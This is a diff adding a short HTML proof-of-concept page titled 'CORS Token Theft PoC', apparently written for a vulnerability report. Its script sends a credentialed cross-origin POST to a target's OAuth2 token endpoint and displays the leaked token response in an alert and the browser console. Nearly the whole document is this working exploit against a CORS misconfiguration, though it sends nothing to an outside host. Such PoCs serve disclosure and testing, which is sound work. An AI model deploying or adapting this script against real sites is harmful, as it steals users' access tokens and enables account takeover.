@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Token Theft PoC</h2>
+    <p>Check the browser alert or console for the leaked access token.</p>
+    <script>
+      fetch("https://target.com/oauth2/token", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "grant_type=client_credentials&client_id=xxxx&client_secret=xxxx"
+      })
+      .then(response => response.text())
+      .then(data => {
+        alert("Token Response:\n" + data);
+        console.log("Token Response:", data);
+      })
+      .catch(err => {
+        alert("Fetch failed: " + err);
+        console.error("Error:", err);
+      });
+    </script>
+  </body>
+</html>
